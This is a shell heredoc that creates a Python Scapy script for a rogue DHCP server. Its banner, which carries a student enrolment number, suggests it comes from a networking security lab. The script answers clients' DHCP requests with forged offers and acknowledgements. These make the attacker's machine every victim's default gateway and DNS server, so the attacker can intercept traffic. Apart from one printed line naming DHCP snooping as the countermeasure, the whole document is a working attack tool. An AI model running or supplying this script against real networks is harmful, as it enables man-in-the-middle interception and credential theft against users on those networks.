cat > 03_dhcp_spoofing.py << 'EOF'
#!/usr/bin/env python3
import sys, signal, threading
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sniff, sendp, get_if_hwaddr, conf

INTERFAZ      = "eth0"
ROGUE_GW      = "20.21.11.50"
ROGUE_DNS     = "20.21.11.50"
ROGUE_MASCARA = "255.255.255.0"
ROGUE_LEASE   = 3600
POOL_INICIO   = "20.21.11.101"
POOL_FIN      = "20.21.11.150"

corriendo    = True
asignaciones = {}
offers_env   = 0
acks_env     = 0
lock         = threading.Lock()

def salir(sig, frame):
    global corriendo
    print(f"\n[!] Detenido. OFFERs: {offers_env}  ACKs: {acks_env}")
    print(f"    Hosts capturados: {len(asignaciones)}")
    print("  CONTRAMEDIDA: SW1(config)# ip dhcp snooping vlan 10")
    corriendo = False
    sys.exit(0)

def ip_a_int(ip):
    p = list(map(int, ip.split(".")))
    return (p[0]<<24)|(p[1]<<16)|(p[2]<<8)|p[3]

def int_a_ip(n):
    return f"{(n>>24)&0xFF}.{(n>>16)&0xFF}.{(n>>8)&0xFF}.{n&0xFF}"

def siguiente_ip(mac):
    with lock:
        if mac in asignaciones:
            return asignaciones[mac]
        inicio = ip_a_int(POOL_INICIO)
        fin    = ip_a_int(POOL_FIN)
        usadas = set(map(ip_a_int, asignaciones.values()))
        for c in range(inicio, fin+1):
            if c not in usadas:
                ip = int_a_ip(c)
                asignaciones[mac] = ip
                return ip
    return None

def enviar_offer(pkt):
    global offers_env
    mac_cli = pkt[Ether].src
    ip_ofer = siguiente_ip(mac_cli)
    if not ip_ofer:
        return
    mac_atk = get_if_hwaddr(INTERFAZ)
    offer = (
        Ether(src=mac_atk, dst="ff:ff:ff:ff:ff:ff")
        / IP(src=ROGUE_GW, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(op=2, yiaddr=ip_ofer, siaddr=ROGUE_GW,
                chaddr=pkt[BOOTP].chaddr,
                xid=pkt[BOOTP].xid, flags=0x8000)
        / DHCP(options=[
            ("message-type",  "offer"),
            ("server_id",     ROGUE_GW),
            ("lease_time",    ROGUE_LEASE),
            ("subnet_mask",   ROGUE_MASCARA),
            ("router",        ROGUE_GW),
            ("name_server",   ROGUE_DNS),
            "end"
        ])
    )
    sendp(offer, iface=INTERFAZ, verbose=False)
    offers_env += 1
    print(f"  [OFFER] -> {mac_cli}  IP: {ip_ofer}  GW FALSO: {ROGUE_GW}")

def enviar_ack(pkt):
    global acks_env
    mac_cli = pkt[Ether].src
    ip_asig = siguiente_ip(mac_cli)
    if not ip_asig:
        return
    server_id = None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "server_id":
            server_id = opt[1]
            break
    if server_id and server_id != ROGUE_GW:
        return
    mac_atk = get_if_hwaddr(INTERFAZ)
    ack = (
        Ether(src=mac_atk, dst="ff:ff:ff:ff:ff:ff")
        / IP(src=ROGUE_GW, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(op=2, yiaddr=ip_asig, siaddr=ROGUE_GW,
                chaddr=pkt[BOOTP].chaddr,
                xid=pkt[BOOTP].xid, flags=0x8000)
        / DHCP(options=[
            ("message-type",  "ack"),
            ("server_id",     ROGUE_GW),
            ("lease_time",    ROGUE_LEASE),
            ("subnet_mask",   ROGUE_MASCARA),
            ("router",        ROGUE_GW),
            ("name_server",   ROGUE_DNS),
            "end"
        ])
    )
    sendp(ack, iface=INTERFAZ, verbose=False)
    acks_env += 1
    print(f"  [ACK]   -> {mac_cli}  IP: {ip_asig}  GW: {ROGUE_GW} <- FALSO")

def procesar(pkt):
    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
        return
    tipo = None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "message-type":
            tipo = opt[1]
            break
    if tipo == 1:
        print(f"  [DISCOVER] <- {pkt[Ether].src}")
        enviar_offer(pkt)
    elif tipo == 3:
        print(f"  [REQUEST]  <- {pkt[Ether].src}")
        enviar_ack(pkt)

def main():
    signal.signal(signal.SIGINT, salir)
    conf.verb = 0

    print("=" * 50)
    print("  ATAQUE DHCP Spoofing - Matricula 20211150")
    print("=" * 50)
    print(f"  Interfaz  : {INTERFAZ}")
    print(f"  GW Falso  : {ROGUE_GW} (Kali)")
    print(f"  DNS Falso : {ROGUE_DNS}")
    print(f"  Pool      : {POOL_INICIO} - {POOL_FIN}")
    print("  Ctrl+C para detener\n")

    sniff(iface=INTERFAZ,
          filter="udp and (port 67 or port 68)",
          prn=procesar, store=False,
          stop_filter=lambda _: not corriendo)

if __name__ == "__main__":
    main()
EOF
echo "Spoofing ha sido creado"
